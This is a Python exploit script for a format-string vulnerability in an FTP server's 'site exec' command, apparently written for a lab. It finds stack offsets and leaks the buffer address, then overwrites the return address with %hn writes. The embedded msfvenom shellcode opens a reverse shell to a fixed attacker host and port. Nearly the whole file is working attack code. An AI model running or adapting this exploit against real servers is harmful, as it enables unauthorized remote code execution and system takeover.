#!/usr/bin/env python3

import sys
import socket
import struct

BAD_CHARS = b'\x00\x09\x0a\x0d\x20\x25\x2f\x00\x09\x0a\x0d\x20\x25\x2f\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a'

class bcolors:
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    SUCCESS = '\033[92m'
    WARNING = '\033[93m'
    ERROR = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def wrap_success(msg):
    return f'{bcolors.SUCCESS}{bcolors.BOLD}{msg}{bcolors.END}'


def wrap_cyan(msg):
    return f'{bcolors.CYAN}{bcolors.BOLD}{msg}{bcolors.END}'


def banner(s):
    print(s.recv(1024))


def login(s):
    s.send(b'user user\n')
    print(s.recv(1024))
    s.send(b'pass password\n')
    print(s.recv(1024))


def site_exec(s, msg):
    s.send(b'site exec ' + msg + b'\n')
    response = s.recv(65535)
    if response.startswith(b'200') and not b'end of' in response:
        response += s.recv(65535)
    return response


def has_bad_chars(msg):
    for char in msg:
        if char in BAD_CHARS:
            return True
    return False


def craft_find_buf_pops(pops):
    exploit_str = b'aaaaaaaa '
    exploit_str += b'%' + bytes(str(pops), 'utf-8') + b'$08x '
    return exploit_str


def find_buffer_pops_padding(ip, port):
    pops_to_buf = 1
    prev_response = b'' # keeps track of prev response to count number of bytes to pad

    input(f'[*] Starting to find number of {wrap_cyan("pops")} and {wrap_cyan("padding")} bytes to reach {wrap_cyan("buffer on stack")}... press enter to continue..')
    while True:
        print(f'[*] (Re)connecting..')
        with socket.socket() as s:
            s.connect((ip, port))
            banner(s)
            login(s)

            # Keep reusing this session if it didn't break
            while True:
                print(f'\n[*] Trying with {pops_to_buf} pops')
                exploit_str = craft_find_buf_pops(pops_to_buf)
                print(f'[*] Exploit crafted:')
                print(exploit_str)
                response = site_exec(s, exploit_str)
                pops_to_buf += 1
                print(response)

                if not response:
                    break # break out of this socket session and force reconnect

                if response[13:21] != b'61616161':
                    prev_response = response
                    continue

                # Found
                pops_to_buf -= 1 # remove the increment made a few lines back
                padding = prev_response.count(b'61')
                print(f'[+] Success. Buffer found at {wrap_success(pops_to_buf)} pops, {wrap_success(padding)} bytes padding before this pop.')
                return pops_to_buf, padding


def craft_find_buf_addr(pops):
    exploit_str = b'_' * 14 + b'%%'
    exploit_str += b'%' + bytes(str(pops), 'utf-8') + b'$s'
    return exploit_str


def read_value_at_pops(s, pops):
    exploit_str = b'val:%' + bytes(str(pops), 'utf-8') + b'$08x'
    response = site_exec(s, exploit_str)
    print(response)
    if response:
        response = response.split(b'\r\n')[0]
        if b'val:' in response:
            response = response.split(b'val:')[1]
            return response
    return None


def find_buffer_address(ip, port):
    pops_to_buf_addr = 300 # for demo, can skip by starting with 300, it's at 303

    input(f'\n[*] Press any key to continue with finding the {wrap_cyan("address of this buffer")}...')
    while True:
        print(f'[*] (Re)connecting..')
        with socket.socket() as s:
            s.connect((ip, port))
            banner(s)
            login(s)

            # Keep reusing this session if it didn't break
            while True:
                print(f'\n[*] Trying with {pops_to_buf_addr} pops')
                exploit_str = craft_find_buf_addr(pops_to_buf_addr)
                print(f'[*] Exploit crafted:')
                print(exploit_str)
                response = site_exec(s, exploit_str)
                print(response)
                pops_to_buf_addr += 1

                if not response:
                    break # break out of this socket session and force reconnect

                # Check if there are more than 14 underscores, means server returned us more than what we gave, meaning it printed the buffer in memory with %s
                response = response.split(b'\r\n')[0]
                if response.count(b'_') <= 14:
                    continue

                # Found, but check if it's in heap or stack. If heap, skip
                print(f'[+] Found. Pops required to reach a location containing the address of the buffer: {pops_to_buf_addr - 1}')
                buf_addr = read_value_at_pops(s, pops_to_buf_addr - 1)
                print(f'[+] Value at {pops_to_buf_addr - 1} pops: {buf_addr}')
                if not buf_addr or not buf_addr.startswith(b'ff'):
                    print(f'[-] Buffer is in heap, continuing')
                    continue

                # Found buffer's address on stack
                buf_addr_int = int(b'0x' + buf_addr, 16)
                buf_addr_int += len('SITE exec ') # cheat slightly, this buf addr points to "SITE exec _____...", account for the front part and adjust buff addr to start at the first underscore
                print(f'[+] Success. Address of buffer on stack found. Buffer\'s address: {wrap_success(hex(buf_addr_int))}')
                return buf_addr_int


def craft_exploit_string(pops, pad_bytes, shellcode_addr, return_addr):
    # (0x00) Pad
    exploit_str = pad_bytes * b'a'

    # (0x00 + pad bytes) Return addr location (lower) to write to (pop)
    packed = struct.pack('<I', return_addr)
    if has_bad_chars(packed): return None
    exploit_str += packed

    # (0x04 + pad bytes) Return addr location (higher) to write to (pop+1)
    packed = struct.pack('<I', return_addr + 2)
    if has_bad_chars(packed): return None
    exploit_str += packed

    # (0x08 + pad bytes) Shellcode: msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.17.0.5 LPORT=7777 -f py -b '\x00\x09\x0a\x0d\x20\x25\x2f\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a' (92 bytes)
    exploit_str += b"\x90" * 16
    exploit_str += b"\x29\xc9\x83\xe9\xef\xe8\xff\xff\xff\xff\xc0\x5e\x81"
    exploit_str += b"\x76\x0e\xef\x7d\x0c\x96\x83\xee\xfc\xe2\xf4\xde\xa6"
    exploit_str += b"\xfb\x75\xbc\x3e\x5f\xfc\xed\xf4\xed\x26\x89\xb0\x8c"
    exploit_str += b"\x05\xb6\xcd\x33\x5b\x6f\x34\x75\x6f\x87\xd1\x1d\x96"
    exploit_str += b"\xea\x15\x0e\x96\xf1\x1c\x85\x77\x5f\x1b\x5c\xc7\xbc"
    exploit_str += b"\xce\x0f\x1f\x0e\xb0\x8c\xc4\x87\x13\x23\xe5\x87\x15"
    exploit_str += b"\x23\xb9\x8d\x14\x85\x75\xbd\x2e\x85\x77\x5f\x76\xc1"
    exploit_str += b"\x16"

    # Write 0xb8d0 to the address at POP, which is the return addr location (lower)
    bytes_written = len(exploit_str)
    lower_shellcode_addr = shellcode_addr & 0xffff
    remaining_bytes = lower_shellcode_addr - bytes_written
    exploit_str += b'%' + bytes(str(remaining_bytes), 'utf-8') + b'x'
    exploit_str += b'%' + bytes(str(pops), 'utf-8') + b'$hn'

    # Write 0xffff to the address at POP+1, which is the return addr location (higher)
    higher_shellcode_addr = shellcode_addr >> 16
    exploit_str += b'%' + bytes(str(higher_shellcode_addr - lower_shellcode_addr), 'utf-8') + b'x'
    exploit_str += b'%' + bytes(str(pops + 1), 'utf-8') + b'$hn'

    return exploit_str.replace(b'\xff', b'\xff\xff')


def find_and_overwrite_return_address(ip, port, pops, padding, buf_addr):
    shellcode_addr = buf_addr + padding + 4 + 4 # shellcode addr = start of buf addr + padding + addr of saved return addr (lower) + addr of saved return addr (higher), refer to craft_exploit_string
    return_addr_guess = buf_addr + padding + 2048 # for demo, can skip 2000, it's at buf addr + padding + 2092

    input(f'\n[*] Press enter to continue finding and overwriting {wrap_cyan("return addresses")} with our shellcode address of {wrap_cyan(hex(shellcode_addr))} (buffer address {wrap_success(hex(buf_addr))} + {shellcode_addr - buf_addr} bytes)... press enter to continue..')
    while True:
        print(f'[*] (Re)connecting..')
        with socket.socket() as s:
            s.connect((ip, port))
            banner(s)
            login(s)

            # Keep reusing this session if it didn't break
            while True:
                print(f'\n[*] Will be trying to write to {hex(return_addr_guess)} (starting addr + {return_addr_guess - (buf_addr + padding)} bytes)')
                exploit_str = craft_exploit_string(pops, padding, shellcode_addr, return_addr_guess)
                return_addr_guess += 4
                print(f'[*] Exploit string that is going to be sent:')
                print(exploit_str)

                if not exploit_str:
                    print(f'[*] Skipping {hex(return_addr_guess - 4)}, has bad chars')
                    continue

                print(f'[*] Executing..')
                response = site_exec(s, exploit_str)

                if response:
                    print('[+] Response:')
                    print(response)
                else:
                    print('[-] No response')
                    break # break out of this socket session and force reconnect


def main():
    if len(sys.argv) < 3:
        print(f'[*] Usage: {sys.argv[0]} ip port')
        exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])

    pops, padding = find_buffer_pops_padding(ip, port)
    buf_addr = find_buffer_address(ip, port)
    find_and_overwrite_return_address(ip, port, pops, padding, buf_addr)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print()

